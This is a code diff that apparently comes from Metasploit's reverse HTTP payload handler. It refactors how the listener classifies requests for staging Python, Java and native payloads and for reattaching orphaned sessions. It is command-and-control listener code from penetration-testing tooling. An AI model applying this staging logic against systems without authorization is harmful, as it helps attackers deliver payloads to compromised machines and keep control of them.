@@ -215,12 +215,16 @@ protected
 
     print_status("#{cli.peerhost}:#{cli.peerport} Request received for #{req.relative_resource}...")
 
-    uri_match = process_uri_resource(req.relative_resource)
+    info = process_uri_resource(req.relative_resource)
+
+    conn_id = nil
+    if info[:mode] && info[:mode] != :connect
+      conn_id = generate_uri_connect_uuid(info[:uuid], obj.arch, obj.platform)
+    end
 
     # Process the requested resource.
-    case uri_match
-      when /^\/INITPY/
-        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
+    case info[:mode]
+      when :init_python
         url = payload_uri(req) + conn_id + '/'
 
         blob = ""
@@ -254,8 +258,7 @@ protected
         })
         self.pending_connections += 1
 
-      when /^\/INITJM/
-        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
+      when :init_java
         url = payload_uri(req) + conn_id + "/\x00"
 
         blob = ""
@@ -282,8 +285,7 @@ protected
           :ssl                => ssl?
         })
 
-      when /^\/A?INITM?/
-        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
+      when :init_native
         url = payload_uri(req) + conn_id + "/\x00"
 
         print_status("#{cli.peerhost}:#{cli.peerport} Staging connection for target #{req.relative_resource} received...")
@@ -318,11 +320,9 @@ protected
           :ssl                => ssl?,
         })
 
-      when /^\/CONN_.*\//
+      when :connect
         resp.body = ""
-        # Grab the checksummed version of CONN from the payload's request.
-        conn_id = req.relative_resource.gsub("/", "")
-
+        conn_id = req.relative_resource
         print_status("Incoming orphaned session #{conn_id}, reattaching...")
 
         # Short-circuit the payload's handle_connection processing for create_session
